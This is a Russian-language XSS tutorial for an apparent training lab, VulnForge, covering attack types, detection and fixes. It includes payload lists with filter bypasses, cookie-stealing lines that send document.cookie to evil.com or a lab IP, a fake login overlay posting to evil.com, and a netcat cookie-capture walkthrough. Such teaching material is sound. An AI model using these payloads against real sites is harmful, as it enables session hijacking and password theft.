# Межсайтовый скриптинг (Cross-Site Scripting, XSS) — CWE-79

## Что это такое?

XSS — это уязвимость, которая позволяет злоумышленнику внедрить вредоносный код (обычно JavaScript) в веб-страницу, которую видят другие пользователи. Код выполняется в браузере жертвы с правами этого сайта.

## Как это работает?

### Нормальное поведение

Пользователь вводит поисковый запрос:
```
URL: /search.php?q=ноутбук
Ответ: <h3>Результаты поиска для: ноутбук</h3>
```

Данные из URL отобразились на странице.

### Инъекция

Злоумышленник вводит HTML/JavaScript вместо поискового запроса:
```
URL: /search.php?q=<img src=x onerror=alert('XSS')>
Ответ: <h3>Результаты поиска для: <img src=x onerror=alert('XSS')></h3>
```

Браузер видит тег `<img>`, пытается загрузить картинку из `src=x` (несуществующий источник), происходит ошибка, срабатывает `onerror` — и JavaScript выполняется.

## Типы XSS

### 1. Отражённая (Reflected XSS)

Вредоносный код передаётся через URL и сразу отображается на странице. Атака срабатывает, когда жертва переходит по специально созданной ссылке.

**Особенности:**
- Не сохраняется на сервере
- Требует перехода жертвы по ссылке
- Часто используется в фишинговых кампаниях

**Пример атаки:**
```html
<!-- Злоумышленник отправляет жертве ссылку -->
https://bank.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

### 2. Хранимая (Stored XSS)

Вредоносный код сохраняется на сервере (в БД, файле, комментариях) и выполняется у всех пользователей, которые просматривают заражённую страницу.

**Особенности:**
- Самая опасная форма XSS
- Не требует перехода по ссылке
- Затрагивает всех посетителей
- Может сохраняться долгое время

**Пример атаки:**
```html
<!-- Злоумышленник оставляет комментарий в блоге -->
Отличная статья! <img src=x onerror="fetch('/admin/delete-all')">
```

### 3. DOM-based XSS

Уязвимость в клиентском JavaScript-коде, который обрабатывает данные из URL, cookie или localStorage без проверки.

**Пример уязвимого кода:**
```javascript
// Берём параметр из URL и вставляем в DOM без проверки
document.getElementById('message').innerHTML = location.hash.substring(1);
```

**Эксплуатация:**
```
URL: /page#<img src=x onerror=alert(1)>
```

**Особенности:**
- Срабатывает на стороне клиента
- Сервер не видит атаку
- Сложнее обнаружить автоматическими сканерами

## Классификация пейлоадов

### Простые (для тестирования)

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>console.log('XSS')</script>
```

### С обработчиками событий

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<video onloadstart=alert(1) src=x>
```

### Без тега `<script>` (обход фильтров)

```html
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<a href=javascript:alert(1)>click me</a>
<iframe src=javascript:alert(1)>
```

### С обходом экранирования кавычек

```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### Кража cookie

```html
<script>fetch('https://evil.com/log?c='+document.cookie)</script>
<img src=x onerror="fetch('http://172.18.0.1:4444/?c='+document.cookie)">
<script>new Image().src='https://evil.com/log?c='+document.cookie</script>
```

**Важно:** В стенде VulnForge для кражи cookie используйте IP хоста в Docker-сети (обычно `172.18.0.1`):
```bash
# Узнать IP:
docker network inspect vulnforge-net | grep Gateway
```

### Фишинговая форма

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;">
  <h2>Сессия истекла. Войдите заново:</h2>
  <form action="https://evil.com/steal">
    <input name="login" placeholder="Логин">
    <input name="pass" type="password" placeholder="Пароль">
    <button>Войти</button>
  </form>
</div>
```

## Почему это опасно?

| Угроза | Описание | Impact |
|--------|----------|--------|
| Кража cookie | Злоумышленник получает сессию жертвы | Критический |
| Фишинг | Подмена интерфейса, кража паролей | Высокий |
| Keylogging | Запись всех нажатий клавиш | Высокий |
| CSRF через XSS | Выполнение действий от имени жертвы | Высокий |
| Майнинг | Внедрение криптомайнеров в браузер | Средний |
| Перенаправление | Перевод на вредоносный сайт | Средний |

## Как найти уязвимость?

### Ручной поиск

1. **Ищите точки отражения ввода:** параметры URL, формы, заголовки
2. **Введите тестовую строку:** `xss_test_12345`
3. **Найдите в ответе:** где отобразилась строка?
4. **Проверьте контекст:** внутри HTML? внутри тега? внутри JavaScript?
5. **Подберите пейлоад** под конкретный контекст

### Контексты отражения

**Внутри HTML-тега:**
```html
<div>ВАШ_ВВОД</div>
→ <div><img src=x onerror=alert(1)></div>
```

**Внутри атрибута:**
```html
<input value="ВАШ_ВВОД">
→ "><img src=x onerror=alert(1)>
```

**Внутри JavaScript:**
```javascript
<script>var q = "ВАШ_ВВОД";</script>
→ "; alert(1); //
```

### Признаки уязвимости

- HTML-теги рендерятся (жирный текст, картинки)
- JavaScript-алерты срабатывают
- Спецсимволы (`<`, `>`, `"`) не экранируются

### Инструменты

```bash
# VulnScanner Pro
./vulnscanner "http://xss.vulnforge.local/search.php?q=test"

# XSStrike
python3 xsstrike.py -u "http://target.com/page.php?param=test"

# Burp Suite
```

## Как исправить?

### 1. Экранирование вывода (основное)

Контекстное экранирование в зависимости от того, куда попадает ввод:

**В HTML:**
```php
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

**В атрибуте:**
```php
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

**В JavaScript:**
```php
echo json_encode($input, JSON_HEX_TAG | JSON_HEX_AMP);
```

**В URL:**
```php
echo urlencode($input);
```

### 2. Content Security Policy (CSP)

HTTP-заголовок, который ограничивает источники скриптов:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
```

### 3. HttpOnly Cookie

Флаг, запрещающий JavaScript доступ к cookie:
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 4. Валидация ввода

```php
// Белый список допустимых символов
if (!preg_match('/^[a-zA-Z0-9 ]+$/', $input)) {
    die("Недопустимые символы");
}
```

### 5. Современные фреймворки

Используйте фреймворки с автоэкранированием:
- React (JSX автоматически экранирует)
- Vue.js (автоэкранирование в шаблонах)
- Angular (DomSanitizer)
- Laravel (Blade `{{ }}` экранирует)

**Внимание:** `{!! !!}` в Blade и `dangerouslySetInnerHTML` в React отключают экранирование!

## Практика в стенде

| Задание | URL | Сложность | Рабочий пейлоад |
|---------|-----|-----------|-----------------|
| Отражённая XSS | `/search.php?q=` | Лёгкая | `<img src=x onerror=alert(1)>` |
| Хранимая XSS | `/index.php` | Средняя | `<img src=x onerror=alert('XSS')>` |
| Кража cookie | `/index.php` | Сложная | `<img src=x onerror="fetch('http://172.18.0.1:4444/?c='+document.cookie)">` |

**Запуск через CLI:**
```bash
./vulnforge task start 4    # Отражённая XSS
./vulnforge task start 5    # Хранимая XSS
./vulnforge task start 6    # Кража cookie
```

**Для кражи cookie:**
1. Запустите слушатель: `nc -lvp 4444`
2. Войдите как пользователь: `http://xss.vulnforge.local/index.php?login=admin`
3. Оставьте комментарий с пейлоадом кражи cookie
4. Откройте страницу в новом приватном окне (другая "жертва")
5. В netcat придёт запрос с cookie

## CVSS Score: 6.1 (Medium) для Reflected, 8.5 (High) для Stored

**Reflected XSS:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
```

**Stored XSS:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
```

## Дополнительные материалы

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger XSS Tutorial](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
